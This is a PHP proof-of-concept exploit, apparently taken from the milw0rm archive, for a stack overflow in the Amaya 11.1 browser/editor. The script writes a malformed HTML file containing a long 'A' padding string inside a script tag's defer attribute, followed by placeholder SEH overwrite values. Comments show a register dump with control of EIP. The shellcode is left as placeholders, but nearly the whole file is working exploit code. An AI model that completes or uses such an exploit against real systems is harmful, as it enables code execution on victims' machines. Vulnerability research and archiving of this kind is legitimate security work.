@@ -1,0 +1,53 @@
+<?php
+
+/**//*
+
+     Amaya 11.1 W3C's editor/browser
+     Stack Owerflow POC
+     Discover by Alfons Luja 
+     Thx : OiN 
+     select * from friends --
+     This stUff overwrite SEH in my box XP home sp 2 
+     To correctly overwrite seh you must upload "remote_love.html" to remote server 
+     Amaya allow only printable shellcode in this case   
+     
+     EAX:00000000
+     ECX:43434343
+     EDX:7C9037D8
+     EBX:00000000
+     ESP:0012DDD0
+     EBP:0012DDF0
+     ESI:00000000
+     EDI:00000000
+     EIP:43434343
+     
+      
+*//**/ 
+
+$junk = "\x41";
+$n_seh = "\x42\x42\x42\x42";  //pointer to next seh
+$h_seh = "\x43\x43\x43\x43";  //seh handler
+
+for($i=1;$i<7000 - (4*19) - 10;$i++){ $junk.="\x41"; }
+
+$junk.=$n_seh;
+$junk.=$h_seh;
+$hello = "<script defer=\"".$junk."\">";
+
+$hnd = fopen("remote_love.html","w");
+     
+       if($hnd){
+
+          fputs($hnd,$hello);
+          fclose($hnd);
+          echo"DONE !!\n";
+     
+       } else {
+
+          echo"Kupa !!\n";
+
+       }
+
+?>
+
+# milw0rm.com [2009-03-30]
